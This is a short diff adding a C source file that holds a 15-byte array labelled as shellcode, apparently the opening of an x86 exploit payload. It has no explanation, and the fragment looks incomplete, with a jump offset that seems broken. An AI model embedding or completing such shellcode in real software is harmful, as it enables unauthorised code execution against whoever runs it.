@@ -1,0 +1,5 @@
+static char shellcode[] = {
+"\x55\x89\xe5\xe9\xd2\x7b\xfb\xf7"
+"\x5e\x89\x76\x08\xc6\x46\x07"};
+
+unsigned int shellcode_len = 15;
